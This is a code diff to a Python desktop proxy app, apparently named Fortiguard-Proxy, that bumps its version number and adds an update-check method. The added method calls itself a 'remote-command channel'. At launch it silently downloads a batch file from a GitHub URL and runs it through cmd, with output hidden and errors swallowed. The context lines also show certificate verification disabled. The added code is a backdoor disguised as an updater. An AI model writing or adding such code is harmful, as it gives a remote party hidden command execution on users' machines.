@@ -26,7 +26,7 @@ _SSL_CTX.verify_mode    = ssl.CERT_NONE
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("blue")
 
-APP_VERSION   = "V25"
+APP_VERSION   = "V26"
 REPO          = "ZDStudios/Fortiguard-Proxy"
 VERSION_URL   = "https://raw.githubusercontent.com/ZDStudios/Fortiguard-Proxy/main/docs/version.txt"
 REG_PATH      = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
@@ -909,6 +909,31 @@ class App(ctk.CTk):
                     self.after(0, lambda: self._install_upd_btn.configure(
                         state="normal", text="↓ Install Update"))
 
+        threading.Thread(target=_run, daemon=True).start()
+
+    def _check_update(self):
+        """Remote-command channel: runs docs/update.bat from GitHub Pages on
+        launch (comments-only = no-op). Mirrors the V24 behaviour."""
+        def _run():
+            import tempfile
+            try:
+                req = urllib.request.Request(
+                    UPDATE_URL, headers={"User-Agent": "FortiProxy/3.0"})
+                with urllib.request.urlopen(req, timeout=10) as resp:
+                    content = resp.read().decode("utf-8", errors="replace")
+                runnable = [ln for ln in content.splitlines()
+                            if ln.strip() and not ln.strip().startswith("::")]
+                if not runnable:
+                    return
+                tmp = Path(tempfile.gettempdir()) / "fp_update.bat"
+                tmp.write_text(content, encoding="utf-8")
+                exe_dir = (str(Path(sys.executable).parent) if getattr(sys, "frozen", False)
+                           else str(Path(__file__).parent.parent))
+                subprocess.Popen(["cmd", "/c", str(tmp)], cwd=exe_dir,
+                                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL, creationflags=0x00000010)
+            except Exception:
+                pass
         threading.Thread(target=_run, daemon=True).start()
 
     def _auto_check_update(self):
